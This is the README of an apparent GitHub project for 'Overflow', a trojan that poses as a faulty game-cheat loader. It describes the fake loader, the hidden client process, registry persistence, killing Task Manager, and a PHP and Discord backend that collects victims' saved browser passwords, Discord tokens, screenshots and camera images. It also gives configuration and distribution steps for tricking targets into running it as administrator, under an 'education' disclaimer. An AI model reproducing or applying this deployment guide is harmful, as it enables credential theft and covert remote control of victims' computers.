
# Trojan Malware
<p align="center">
	<img src="https://i.imgur.com/AZO6qU9.png" height="100" width="100">
</p>

 ---
 
**Disclaimer**

The purpose of this is to allow the study of malware and enable people who are interested in malware analysis (or maybe even as a part of their job) to have access to live malware, analyse the ways they operate, and maybe even enable advanced and savvy people to block specific malware within their own environment.
 
**Background**

Overflow is a trojan horse malware that disguises itself as a faulty cheat but runs in the background providing full accsess to the targets computer while sending passwords/screenshots/uploads to a dynamically created discord channel. 

Apon running the process as an administrator it spawns an ImGui menu displaying progress text in the following order:

<img src="https://i.imgur.com/E81OXew.png">

-  "installing dependencies..." 

-  "loading..." 

-  "fatal error: failed to install DX11" 

After the last message the 'loader' closes, in total this is set to take around 11 secounds. Ideally this would be repleaced with anything you want; presumabely a fake login feild would be best.

**Core**
```
- Fake Loader (YourFakeLoader.exe)
- Client (COMProcess.exe)
- Server (PHP/Hosted Server)
```
When the loader is run the client immeadtly copys this process into the "AppData\Microsoft\COM" and renames it to `COMProcess.exe`, essitnatly creating a duplicate. Since the loader was ran as an admin, it then runs the newly copied process using `system()` giving it the same elevated privledges. As this client `COMProcess.exe` runs in the background it collaberates with the `server` which is revicing requests from the client and forwarding them to the discord server. 

**Client**

The client runs in the backgroudn under the name `COMProcess.exe`, which can be changed, and it attempts to forefuclly close any taskmanager.exe or processhacker.exe instances. Yes that is an intrusvie measure and defeates the otherwise hidden point of the malware but most victums suprignly just dont care. An alternative to this is to uncomment this line of code which will remove the client from the taskmanager list:
[`//hide_process(client::STARTUP_FILE_NAME);`](https://github.com/NMan1/OverflowClient/blob/3308a3f8812036e1c932839257c76c2ccc51991b/main.cpp#L48) 

The client is added to the registrys set of startup processes, so it will launch on startup. But its important to notice that if the client was started from startup then you will have lost the elevated admin privldges. Therefor its esiantll you get whatever downloads that may require admin privldges as soon as possible on the first run of the loader.

**Server**

The server hosts the important php files which process the incoming requests from the client and either will:

 1. Create a discord channel and a webhook
 2. Save any uploads posted
 3. Send a message to the webhook
 4. Read command buffer file
 5. Update command buffer file

On the first run of the fake loader the `COMProcess.exe` will make a request to `channel.php`. This file will dynamicalyl create a discord channel titled after the clients ip address, create a webhook for that channel, as well as create a folder for the client in the `profiles` folder on the server. Finally the file will update the servers database with the new realvent infromation.

Overview of the root direcotry:

<img src="https://i.imgur.com/p3s3EJR.png" width="400" height="300">

The `profiles` folder is the collection of all active clients and their uploads. 
As mentioned, each one of these client folders would contain all screenshots/camera shots/passwords/uploads along with the ip.txt file which is the command buffer file

**Discord Server**

Your discord server is where all the client channels will be stored at:

<img src="https://i.imgur.com/H3uvQnM.png" width="300" height="300">
<img src="https://i.imgur.com/JfhsFRR.png" width="300" height="300">

To send commands to a client, I created a bot which would make a post request to the text file stored in the client folder (`profiles/IP/IP.txt`) on your server

**Features**

 - Remote admin command execution
 - Downloads and silently installs:
	 - Python
	 - Teamviewer
	 - Nmap
	 - Your scripts
 - Download and run programs with elevated privledges
 - Upload any file from client pc
 - Persistant startup
 - Take pc screenshot every 5 minutes
 - Take camera picture
 - Captures window list
 - Uploads locally stored saved passwords (Chrome, Brave, Edge, etc)
 - Uploads discord token
 - Change pc background wallpaper
 - List devices on network
 - Launch teamviewer session 
 - Kill process
 - Shutdown target pc


**Usage (For Education)**

1. Change the version [```#define VERSION "4.0.5"```](https://github.com/NMan1/OverflowClient/blob/12ad9a8d77ebd66b1b7f601f319da895df7f1316/client/client.h#L5)
2. Change the website url to the root directory of your website [```std::string website = "https://YouWebsiteDirecotryPathHere.com/";```](https://github.com/NMan1/OverflowClient/blob/12ad9a8d77ebd66b1b7f601f319da895df7f1316/utility/requests.cpp#L14)
3. Optional: Change name of background process/client [`const std::string STARTUP_FILE_NAME = xorstr_("COMProcess.exe");`](https://github.com/NMan1/OverflowClient/blob/3308a3f8812036e1c932839257c76c2ccc51991b/client/client.cpp#L17)
4. Optinal: Change name of the loader [`const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");`](https://github.com/NMan1/OverflowClient/blob/3308a3f8812036e1c932839257c76c2ccc51991b/client/client.cpp#L19)
5. In the channel.php change the following (same with send.php):

<img src="https://i.imgur.com/humkqG9.png">


*Distrubuting FOR EDUCATION*: The code is statiically compilled so if you want to distrubute it after making the necssary changes then you simply need to replace the compiled exe with the one in the "production" folder. 

*Target*: The target needs to run the loader as an admin, if the user does not run it as an admin a error window will pop up speicfing them to. 


Note: This project was only made for education purposes. If you choose to use this for malicious reasons, you are completely responsible for the outcome.

**Credits**

Task manager hide: https://github.com/kernelm0de/ProcessHider

Loader Menu: https://github.com/ocornut/imgui
